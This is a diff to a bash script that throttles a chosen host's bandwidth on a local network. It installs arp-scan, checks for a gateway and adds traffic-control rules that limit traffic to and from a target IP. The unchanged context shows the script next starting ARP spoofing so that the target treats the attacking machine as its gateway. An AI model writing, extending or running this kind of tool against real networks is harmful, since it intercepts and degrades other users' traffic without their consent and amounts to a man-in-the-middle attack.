@@ -52,6 +52,10 @@ check_dependencies() {
         echo -e "${YELLOW}[*] Installing iproute2 (for tc)...${NC}"
         apt-get install -y iproute2
     fi
+    if ! command -v arp-scan &> /dev/null; then
+        echo -e "${YELLOW}[*] Installing arp-scan...${NC}"
+        apt-get install -y arp-scan
+    fi
 }
 
 enable_forwarding() {
@@ -92,7 +96,11 @@ main() {
     
     # Get Gateway
     GATEWAY=$(ip route | grep default | awk '{print $3}')
-    
+    if [[ -z "$GATEWAY" ]]; then
+        echo -e "${RED}[!] No default gateway found. Is the interface connected to a network?${NC}"
+        exit 1
+    fi
+
     # Check for arguments
     if [[ -n "$1" ]]; then
         TARGET_IP="$1"
@@ -142,13 +150,26 @@ main() {
     # 1. Apply Traffic Control (tc)
     # Clear existing rules
     tc qdisc del dev $INTERFACE root 2>/dev/null
-    
-    # Add root handle
-    tc qdisc add dev $INTERFACE root handle 1: htb default 11
-    
-    # Add class with limit
-    tc class add dev $INTERFACE parent 1: classid 1:1 htb rate $SPEED
-    tc class add dev $INTERFACE parent 1:1 classid 1:11 htb rate $SPEED
+
+    # Root qdisc: HTB (default class 12 = unlimited for everyone else)
+    tc qdisc add dev $INTERFACE root handle 1: htb default 12
+
+    # Parent class (full line rate placeholder)
+    tc class add dev $INTERFACE parent 1: classid 1:1 htb rate 1000mbit
+
+    # Throttled class for the target
+    tc class add dev $INTERFACE parent 1:1 classid 1:11 htb rate $SPEED ceil $SPEED
+
+    # Default (unlimited) class for all other traffic
+    tc class add dev $INTERFACE parent 1:1 classid 1:12 htb rate 1000mbit
+
+    # Filter: traffic FROM target IP → throttled class
+    tc filter add dev $INTERFACE parent 1: protocol ip prio 1 u32 \
+        match ip src $TARGET_IP/32 flowid 1:11
+
+    # Filter: traffic TO target IP → throttled class
+    tc filter add dev $INTERFACE parent 1: protocol ip prio 2 u32 \
+        match ip dst $TARGET_IP/32 flowid 1:11
     
     # 2. Start ARP Spoofing in background
     # Tell target that WE are the gateway
